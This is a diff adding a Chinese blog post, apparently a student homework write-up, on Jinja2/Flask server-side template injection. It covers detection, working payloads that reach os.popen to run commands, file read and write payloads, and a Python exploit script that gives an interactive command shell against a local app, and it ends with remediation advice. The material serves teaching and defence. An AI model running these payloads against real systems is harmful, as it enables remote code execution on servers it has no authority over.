@@ -1,0 +1,153 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SSTI-服务端模版注入 | Tabooair</title><meta name="description" content="SSTI-服务端模版注入"><meta name="keywords" content="ssti"><meta name="author" content="Tabooair"><meta name="copyright" content="Tabooair"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="SSTI-服务端模版注入"><meta name="twitter:description" content="SSTI-服务端模版注入"><meta name="twitter:image" content="http://yoursite.com/img/post.jpg"><meta property="og:type" content="article"><meta property="og:title" content="SSTI-服务端模版注入"><meta property="og:url" content="http://yoursite.com/2021/08/10/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"><meta property="og:site_name" content="Tabooair"><meta property="og:description" content="SSTI-服务端模版注入"><meta property="og:image" content="http://yoursite.com/img/post.jpg"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2021/08/10/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"><link rel="next" title="Web_php_unserialize" href="http://yoursite.com/2020/04/26/Web-php-unserialize/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime_unit: 'days',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isSidebar: true  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">5</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI（Server-Side-Template-Injection）-服务端模版注入"><span class="toc-number">1.</span> <span class="toc-text">SSTI（Server-Side Template Injection）-服务端模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-flask-SSTI-jinja2"><span class="toc-number">1.2.</span> <span class="toc-text">python-flask-SSTI-jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask框架"><span class="toc-number">1.2.1.</span> <span class="toc-text">flask框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模版引擎（模版语言）"><span class="toc-number">1.2.2.</span> <span class="toc-text">模版引擎（模版语言）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模版渲染（过程）"><span class="toc-number">1.2.3.</span> <span class="toc-text">模版渲染（过程）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现过程"><span class="toc-number">1.2.4.</span> <span class="toc-text">复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#检测"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.2.5.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload分析"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">payload分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它利用方式："><span class="toc-number">1.2.6.</span> <span class="toc-text">其它利用方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp"><span class="toc-number">1.2.7.</span> <span class="toc-text">Exp:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复"><span class="toc-number">1.2.8.</span> <span class="toc-text">漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/post.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Tabooair</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">SSTI-服务端模版注入</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2021-08-10 16:29:35"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2021-08-10</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2021-08-10 16:42:58"><i class="fa fa-history" aria-hidden="true"></i> Updated 2021-08-10</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h1 id="SSTI（Server-Side-Template-Injection）-服务端模版注入"><a href="#SSTI（Server-Side-Template-Injection）-服务端模版注入" class="headerlink" title="SSTI（Server-Side Template Injection）-服务端模版注入"></a>SSTI（Server-Side Template Injection）-服务端模版注入</h1><ul>
+<li>这是一篇在学校做的作业，看笔记里写的比较完整，po一下</li>
+</ul>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>服务端接收了用户的恶意输入以后，未经任何处理就将其拼接作为 Web 应用模板内容的一部分，服务端web应用使用模版引擎进行编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。（模版可控）</p>
+<ul>
+<li>区别sql注入<br>虽然同属于注入型漏洞，但是sql注入是后端将本语言进行数据库查询的时候，没有做合法处理拼接了用户的输入，造成了sql语句的执行，数据库结构化查询。SSTI模版注入是获取用户的输入后，后端的框架使用模版引擎中的渲染函数生成html的时候，破坏了原本的模版内容，执行了用户输入的代码。</li>
+<li>区别xss<br>对用户输入和输出没有进行合法处理的时候都会出现xss漏洞，某些存在SSTI的应用也会存在xss。但是xss漏洞是前端浏览器执行了js代码，SSTI是后端模版引擎中的渲染函数执行了恶意代码。</li>
+</ul>
+<h2 id="python-flask-SSTI-jinja2"><a href="#python-flask-SSTI-jinja2" class="headerlink" title="python-flask-SSTI-jinja2"></a>python-flask-SSTI-jinja2</h2><h3 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h3><p>Flask 是一个使用 Python 编写的轻量级 Web 应用框架。其模板引擎是使用的Jinja2 。Flask 提供工具，库和技术来允许你构建一个 web 应用程序。这个 web 应用程序可以是一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。</p>
+<ul>
+<li>其它框架：比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</li>
+</ul>
+<h3 id="模版引擎（模版语言）"><a href="#模版引擎（模版语言）" class="headerlink" title="模版引擎（模版语言）"></a>模版引擎（模版语言）</h3><p>用于web应用开发的模版引擎，为了让业务逻辑（后端试图函数，处理用户请求以及数据存取操作等）和页面逻辑（前端html页面）分离，生成一个标准的html文档。后端代码是 Python 代码，前端代码是 HTML 代码，两种代码分别写在视图函数和模板文件中。</p>
+<p>模版引擎会提供一套生成html代码的程序，只需要获取用户的数据，然后放在渲染函数里，生成带有用户输入数据的前端html页面（替换特定位置上预先定义好的占位变量），反馈给浏览器。</p>
+<ul>
+<li>jinja2是flask框架内置的模版引擎。</li>
+</ul>
+<p>jinja2中常见语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">&#123;&#123;name&#125;&#125;结构：表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</span><br><span class="line">&#123;%if..%&#125;&#123;%else..%&#125;&#123;%for..%&#125;：控制结构</span><br><span class="line">&#123;# ... #&#125;：注释，模板渲染的时候会忽视这中间的值</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其它模版：Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。</li>
+</ul>
+<h3 id="模版渲染（过程）"><a href="#模版渲染（过程）" class="headerlink" title="模版渲染（过程）"></a>模版渲染（过程）</h3><p>通过动态赋值 ，将重新翻译好的html文件(模板引擎生效) 返回给用户的过程。</p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul>
+<li><p>注入探测字符，例如：?name={ {7*8} }，查看应用程序是否进行了相应的计算并显示</p>
+</li>
+<li><p><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/Qsr2yUkdXFpLJKB.jpg"  alt=""><br><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/12seIN7Lgxy8UGW.jpg"  alt=""><br><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/bXem1rCoYO2PUqI.jpg"  alt=""></p>
+</li>
+</ul>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>获取os模块并执行任意系统命令</p>
+<p>payload：{ { } }语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;&#39;&#39;.class.mro[1].subclasses()[213].init.globals[&#39;os&#39;].popen(&#39;id&#39;).read()&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>url编码之后：</p>
+
+?name={{%27%27.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__[%27__builtins__%27][%27__import__%27](%27os%27).popen("whoami").read()}}
+
+
+<h4 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h4><p><code>{ {&#39;&#39;.__class__} }</code>找到当前类</p>
+<p><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/GEInZHXPB9WtNCS.jpg"  alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123; &#123;&quot;&quot;.__class__.__mro__&#125; &#125; 寻找基类 （也可以用base）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/UgWZovbBI5Mk6rA.jpg"  alt=""></p>
+<p><code>&quot;&quot;.__class__.__mro__[1].__subclasses__()返回object所有子类（需要找到包含os模块的类）</code></p>
+<p><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/6K1TvN42A3am78i.jpg"  alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__查找os类下的的所有方法（在python中就是import的模块，需要使用os模块）</span><br><span class="line">__init__：初始化</span><br><span class="line">__globals__：globals全局来查找所有的方法及变量及参数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/H4Vkb6E7TCmQzKs.jpg"  alt=""></p>
+<p>os.popen()方法：从一个命令打开一个管道，可以执行命令，返回的是文件对象，使用read()方法读取返回的值</p>
+<p><img src="/" class="lazyload" data-src="https://i.loli.net/2021/08/10/g9FQDc2vzNlRyqU.jpg"  alt=""></p>
+<h3 id="其它利用方式："><a href="#其它利用方式：" class="headerlink" title="其它利用方式："></a>其它利用方式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()</span><br><span class="line">object.__subclasses__()[40](r&#39;C:\1.php&#39;).read()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;input&#39;, &#39;w&#39;).write(&#39;123&#39;)</span><br><span class="line">object.__subclasses__()[40](&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;input&#39;, &#39;w&#39;).write(&#39;123&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取eval函数执行任意python代码</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">&#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;&#x2F;&#x2F;python执行系统命令要调用os模块</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp:"></a>Exp:</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;index?name&#x3D;&#39;</span><br><span class="line">while True:</span><br><span class="line">    cmd &#x3D; input(&#39;cmd:&#39;)</span><br><span class="line">    if cmd&#x3D;&#x3D;&#39;exit&#39;:</span><br><span class="line">        break</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;</span><br><span class="line">    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">        &#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">          &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">          &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">            &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">              &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;&#39;&#39;&#39; + cmd + &#39;&#39;&#39;&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    res &#x3D; requests.get(url + payload)</span><br><span class="line">    result &#x3D; re.findall(&#39;Hello (.*)&#39;, res.text, re.S)</span><br><span class="line">    print(result[0].strip())</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><em>核心思想：先渲染后处理用户输入</em></p>
+<ol>
+<li>使用render_template模版函数：（先渲染后替换）</li>
+</ol>
+<p>示例：见python项目（code1）</p>
+<ol start="2">
+<li>更换参数拼接方式（示例：code3）</li>
+</ol>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">def hello():</span><br><span class="line">name&#x3D;request.args.get(&#39;name&#39;,&#39;world&#39;)</span><br><span class="line">temp&#x3D;Template(&#39;Hello &#123;&#123;n&#125;&#125;&#39;)</span><br><span class="line">return temp.render(n&#x3D;name)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/weixin_42635252/article/details/83341226" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42635252/article/details/83341226</a><br><a href="https://blog.csdn.net/qq_57172130/article/details/116378826" target="_blank" rel="noopener">https://blog.csdn.net/qq_57172130/article/details/116378826</a><br><a href="https://www.jianshu.com/p/a736e39c3510" target="_blank" rel="noopener">https://www.jianshu.com/p/a736e39c3510</a></p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tabooair</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2021/08/10/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">http://yoursite.com/2021/08/10/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssti/">ssti</a></div><div class="post_share"><div class="social-share" data-image="/img/post.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2020/04/26/Web-php-unserialize/"><img class="next_cover lazyload" data-src="/img/post.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Web_php_unserialize</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Tabooair</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/click_heart.js"></script></body></html>
